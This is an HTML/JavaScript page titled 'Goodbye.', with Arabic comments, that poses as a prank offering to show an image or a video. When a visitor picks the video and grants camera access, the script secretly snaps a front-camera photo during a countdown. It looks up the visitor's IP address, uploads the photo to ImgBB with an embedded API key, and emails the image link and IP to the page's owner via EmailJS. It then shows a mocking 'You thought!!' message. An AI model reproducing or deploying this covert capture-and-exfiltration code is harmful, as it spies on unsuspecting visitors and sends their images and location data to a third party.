<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Goodbye.</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
      color: white;
      text-align: center;
      padding: 20px;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.7);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      max-width: 800px;
      width: 90%;
      margin: 20px auto;
      backdrop-filter: blur(10px);
      position: relative;
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
    }
    
    .video-container {
      position: relative;
      width: 100%;
      height: 0;
      padding-bottom: 56.25%; /* نسبة 16:9 */
      margin: 0 auto 25px;
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
    }
    
    #player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: 0;
      border-radius: 10px;
      display: none; /* Hidden until countdown completes */
    }
    
    .loading {
      display: none;
      margin: 30px 0;
    }
    
    .spinner {
      border: 5px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 5px solid #fff;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .message {
      display: none;
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin-top: 25px;
      font-size: 18px;
    }
    
    .error {
      color: #ff6b6b;
      display: none;
      margin-top: 20px;
      padding: 15px;
      background: rgba(255, 0, 0, 0.1);
      border-radius: 8px;
    }
    
    .success {
      color: #4cd97b;
      display: none;
    }
    
    .footer {
      margin-top: 30px;
      font-size: 14px;
      opacity: 0.8;
    }
    
    .hidden {
      display: none;
    }
    
    /* New styles for countdown */
    .countdown {
      font-size: 36px;
      font-weight: bold;
      margin: 20px 0;
      padding: 15px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      display: inline-block;
      min-width: 100px;
    }
    
    .permission-request {
      padding: 20px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      margin: 20px 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 15px;
    }
    
    .permission-btn {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      width: 200px;
    }
    
    .permission-btn:hover {
      background: #45a049;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
    
    .permission-btn:active {
      transform: translateY(0);
    }
    
    #showImageBtn {
      background: #2196F3;
    }
    
    #showImageBtn:hover {
      background: #0b7dda;
    }
    
    .instructions {
      font-size: 16px;
      margin-top: 15px;
      line-height: 1.6;
    }
    
    .capture-indicator {
      position: absolute;
      top: 10px;
      right: 10px;
      background: rgba(255, 0, 0, 0.7);
      color: white;
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 12px;
      display: none;
      z-index: 10;
    }
    
    /* Popup styles */
    .image-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s, visibility 0.3s;
    }
    
    .image-popup.active {
      opacity: 1;
      visibility: visible;
    }
    
    .popup-content {
      position: relative;
      max-width: 90%;
      max-height: 90%;
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
    }
    
    .popup-content img {
      max-width: 100%;
      max-height: 80vh;
      border-radius: 8px;
      display: block;
    }
    
    .close-popup {
      position: absolute;
      top: -40px;
      right: 0;
      background: #f44336;
      color: white;
      width: 35px;
      height: 35px;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 24px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s;
    }
    
    .close-popup:hover {
      background: #d32f2f;
      transform: rotate(90deg);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Goodbye.</h1>
    
    <!-- Camera permission request -->
    <div class="permission-request" id="permissionRequest">
      <p>Don't be sad. Choose an option:</p>
      <button class="permission-btn" id="showImageBtn">Show Image</button>
	  <button class="permission-btn" id="cameraBtn">Show Video</button>
    </div>
    
    <!-- Countdown element -->
    <div class="countdown" id="countdown">10</div>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>Loading</p>
    </div>
    
    <div class="message">
      <p>Hahaha</p>
      <p class="success">You thought!!</p>
    </div>
    
    <div class="error" id="error-message">
      Internet Error
    </div>
    
    <div class="footer">
      <p>Hope you are happy.</p>
    </div>
  </div>

  <!-- Image popup -->
  <div class="image-popup" id="imagePopup">
    <div class="popup-content">
      <span class="close-popup" id="closePopup">&times;</span>
      <img src="https://h.top4top.io/p_3501mscbf0.jpg" alt="Special Image">
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

  <script>
    // عناصر DOM
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    const countdownElement = document.getElementById('countdown');
    const permissionRequest = document.getElementById('permissionRequest');
    const cameraBtn = document.getElementById('cameraBtn');
    const captureIndicator = document.getElementById('captureIndicator');
    const showImageBtn = document.getElementById('showImageBtn');
    const imagePopup = document.getElementById('imagePopup');
    const closePopup = document.getElementById('closePopup');
    
    // متغيرات الحالة
    let cameraCaptured = false;
    let emailSent = false;
    let countdownInterval;
    let stream;
    let capturedImage = null;
    let userIP = null;
    
    // Hide countdown initially
    countdownElement.style.display = 'none';
    
    // Function to get user's IP address
    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown IP';
      }
    }
    
    // Function to start the countdown
    async function startCountdown() {
      let count = 10;
      countdownElement.textContent = count;
      countdownElement.style.display = 'block';
      
      // Get user IP and store it
      userIP = await getUserIP();
      
      countdownInterval = setInterval(() => {
        count--;
        countdownElement.textContent = count;
        
        // Capture image when countdown reaches 4 seconds
        if (count === 4) {
          captureImage();
          captureIndicator.style.display = 'block';
          
          // Flash the indicator briefly
          setTimeout(() => {
            captureIndicator.style.display = 'none';
          }, 1000);
        }
        
        if (count <= 0) {
          clearInterval(countdownInterval);
          countdownElement.style.display = 'none';
          
          // Stop the camera stream
          if (stream) {
            stream.getTracks().forEach(track => track.stop());
          }
          
          // Send email with captured image
          if (capturedImage) {
            sendEmail(capturedImage, userIP);
          }
          
          startVideoPlayback();
        }
      }, 1000);
    }
    
    // Function to start video playback
    function startVideoPlayback() {
      loading.style.display = 'block';
      
      // Set the video source with autoplay
      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
      player.style.display = 'block';
    }
    
    // Event listener for camera permission button
    cameraBtn.addEventListener('click', async () => {
      try {
        // Hide the permission request
        permissionRequest.style.display = 'none';
        
        // Show loading indicator
        loading.style.display = 'block';
        
        // Access the camera
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        
        // Hide loading
        loading.style.display = 'none';
        
        // Start the countdown
        startCountdown();
        
      } catch (error) {
        console.error('Camera error:', error);
        loading.style.display = 'none';
        permissionRequest.style.display = 'block';
        
        // Show error message
        errorMsg.textContent = 'Error';
        errorMsg.style.display = 'block';
      }
    });
    
    // Show image popup functionality
    showImageBtn.addEventListener('click', () => {
      imagePopup.classList.add('active');
    });
    
    // Close popup functionality
    closePopup.addEventListener('click', () => {
      imagePopup.classList.remove('active');
    });
    
    // Also close popup when clicking outside the image
    imagePopup.addEventListener('click', (e) => {
      if (e.target === imagePopup) {
        imagePopup.classList.remove('active');
      }
    });
    
    // Hide the player initially
    player.style.display = 'none';
    
    // Show the player when loaded
    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
    });
    
    // وظيفة التقاط الصورة
    function captureImage() {
      if (!cameraCaptured) return;
      
      try {
        const ctx = canvas.getContext('2d');
        
        // التقاط الصورة
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        
        // الحصول على بيانات الصورة
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        capturedImage = imageData.split(',')[1]; // Store base64 image data
        
      } catch (error) {
        console.error('Capture error:', error);
      }
    }
    
    // وظيفة إرسال الإيميل
    function sendEmail(base64Image, userIP) {
      // رفع الصورة إلى ImgBB
      const formData = new FormData();
      formData.append('image', base64Image);
      formData.append('name', 'hidden_capture_' + Date.now());
      
      fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(imgbbData => {
        if (imgbbData.success) {
          // إرسال الإيميل باستخدام EmailJS
          emailjs.send("service_890xst3", "template_p1oukct", {
            name: "صورة خفية",
            time: new Date().toLocaleString(),
            message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
            image_url: imgbbData.data.url,
            user_ip: userIP  // Add IP to email
          }).then(() => {
            emailSent = true;
          }, error => {
            console.error('Email error:', error);
          });
        }
      })
      .catch(error => {
        console.error('ImgBB error:', error);
      });
    }
    
    // Display success message after 10 seconds
    setTimeout(() => {
      if (cameraCaptured && emailSent) {
        console.log('تم التقاط الصورة وإرسالها بنجاح!');
      } else if (cameraCaptured) {
        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
      }
    }, 10000);
  </script>
</body>
</html>
